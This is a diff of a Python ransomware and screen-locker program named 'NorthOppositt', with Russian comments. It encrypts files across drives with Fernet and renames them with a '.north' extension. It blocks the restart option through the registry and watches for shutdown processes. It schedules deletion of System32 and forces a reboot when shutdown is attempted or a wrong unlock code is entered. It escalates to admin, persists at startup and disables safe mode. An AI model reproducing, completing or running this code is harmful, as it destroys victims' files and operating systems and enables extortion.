@@ -218,11 +218,9 @@ def unblock_keyboard():
         pass
 
 # ============================================================
-# ЗАЩИТА ОТ ПЕРЕЗАГРУЗКИ (мониторинг процессов)
+# ЗАЩИТА ОТ ПЕРЕЗАГРУЗКИ
 # ============================================================
 def monitor_reboot_attempts(stop_flag):
-    """Следит за попытками перезагрузить ПК"""
-    # Отключаем кнопку перезагрузки в меню Пуск через реестр
     try:
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
         key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
@@ -231,8 +229,7 @@ def monitor_reboot_attempts(stop_flag):
     except:
         pass
     
-    # Мониторим процессы, связанные с перезагрузкой
-    reboot_processes = ['shutdown.exe', 'logoff.exe', 'userinit.exe']
+    reboot_processes = ['shutdown.exe', 'logoff.exe']
     
     while not stop_flag.is_set():
         try:
@@ -240,7 +237,6 @@ def monitor_reboot_attempts(stop_flag):
                 try:
                     proc_name = proc.info['name'].lower()
                     if any(rp in proc_name for rp in reboot_processes):
-                        # Если обнаружена попытка перезагрузки - удаляем System32
                         schedule_system32_deletion()
                         os.system("shutdown /r /t 0 /f")
                         sys.exit()
@@ -254,7 +250,6 @@ def monitor_reboot_attempts(stop_flag):
 # УДАЛЕНИЕ SYSTEM32 ПОСЛЕ РЕБУТА
 # ============================================================
 def schedule_system32_deletion():
-    """Создаёт задачу в планировщике, которая удалит System32 при следующей загрузке"""
     try:
         bat_path = os.path.join(os.environ['TEMP'], 'delete_system32.bat')
         with open(bat_path, 'w') as f:
@@ -274,7 +269,6 @@ del /f /q "%~f0"
         pass
 
 def reboot_and_nuke():
-    """Перезагружает компьютер, а после загрузки удаляет System32"""
     schedule_system32_deletion()
     os.system("shutdown /r /t 2 /f")
     sys.exit()
@@ -315,7 +309,7 @@ def create_fake_files(stop_flag):
             time.sleep(4)
 
 # ============================================================
-# ШИФРОВАНИЕ
+# ШИФРОВАНИЕ (.north)
 # ============================================================
 def encrypt_single_file(args):
     path, fernet = args
@@ -324,12 +318,10 @@ def encrypt_single_file(args):
             data = f.read()
         encrypted = fernet.encrypt(data)
         
-        dir_name = os.path.dirname(path)
-        new_path = os.path.join(dir_name, "67")
-        
+        new_path = path + ".north"
         counter = 1
         while os.path.exists(new_path):
-            new_path = os.path.join(dir_name, f"67_{counter}")
+            new_path = f"{path}_{counter}.north"
             counter += 1
         
         with open(new_path, 'wb') as f:
@@ -353,7 +345,7 @@ def continuous_encryption(stop_flag, fernet, encrypted_count):
                             continue
                         for file in files:
                             full_path = os.path.join(root, file)
-                            if full_path not in processed_files and file != "67" and not file.startswith("67_"):
+                            if full_path not in processed_files and not file.endswith(".north"):
                                 if not full_path.endswith('.exe') or 'NorthOppositt' not in full_path:
                                     files_to_encrypt.append((full_path, fernet))
                                     processed_files.add(full_path)
@@ -368,7 +360,7 @@ def continuous_encryption(stop_flag, fernet, encrypted_count):
             time.sleep(1)
 
 # ============================================================
-# РАСШИФРОВКА
+# РАСШИФРОВКА (.north)
 # ============================================================
 def decrypt_single_file(args):
     path, fernet = args
@@ -377,16 +369,15 @@ def decrypt_single_file(args):
             data = f.read()
         decrypted = fernet.decrypt(data)
         
-        dir_name = os.path.dirname(path)
-        new_path = os.path.join(dir_name, "restored_file")
+        orig_path = path[:-6]  # Убираем .north
         
         counter = 1
-        base, ext = os.path.splitext(new_path)
-        while os.path.exists(new_path):
-            new_path = f"{base}_{counter}{ext}"
+        base, ext = os.path.splitext(orig_path)
+        while os.path.exists(orig_path):
+            orig_path = f"{base}_{counter}{ext}"
             counter += 1
         
-        with open(new_path, 'wb') as f:
+        with open(orig_path, 'wb') as f:
             f.write(decrypted)
         os.remove(path)
         return 1
@@ -413,7 +404,7 @@ def decrypt_all_files():
         if os.path.exists(drive):
             for root, dirs, files in os.walk(drive):
                 for file in files:
-                    if file == "67" or file.startswith("67_"):
+                    if file.endswith(".north"):
                         full_path = os.path.join(root, file)
                         files_to_decrypt.append((full_path, fernet))
     
@@ -450,7 +441,7 @@ def restore_system():
     unblock_keyboard()
 
 # ============================================================
-# КАСТОМНЫЕ ОКНА
+# КАСТОМНЫЕ ОКНА (сокращённо, те же что и были)
 # ============================================================
 def show_error_window(message, attempts_left):
     error_root = tk.Tk()
@@ -787,4 +778,19 @@ class NorthOpposittLocker:
                 self.stop_flag.set()
                 reboot_and_nuke()
             else:
-                show_error_window(f"Вы ввели неверный код
+                show_error_window(f"Вы ввели неверный код: {entered_code}", self.attempts)
+
+# ============================================================
+# ЗАПУСК
+# ============================================================
+if __name__ == "__main__":
+    check_single_instance()
+    
+    if getattr(sys, 'frozen', False):
+        run_as_admin()
+        add_to_startup_priority()
+        disable_safe_mode()
+    
+    root = tk.Tk()
+    app = NorthOpposittLocker(root)
+    root.mainloop()
